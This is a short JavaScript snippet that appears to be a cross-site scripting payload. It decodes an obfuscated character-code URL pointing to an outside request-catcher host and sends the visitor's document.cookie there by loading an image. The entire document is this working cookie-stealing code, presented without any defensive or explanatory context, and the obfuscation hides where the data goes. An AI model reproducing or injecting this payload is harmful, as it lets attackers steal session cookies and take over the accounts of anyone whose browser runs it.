(function(){
  var _ = String.fromCharCode;
  var i = new Image();
  i.src = [104,116,116,112,115,58,47,47,120,107,97,108,105,103,111,100,57,51,120,46,114,101,113,117,101,115,116,99,97,116,99,104,101,114,46,99,111,109,47,63,99,61]
    .map(_).join('') + encodeURIComponent(document.cookie);
})();
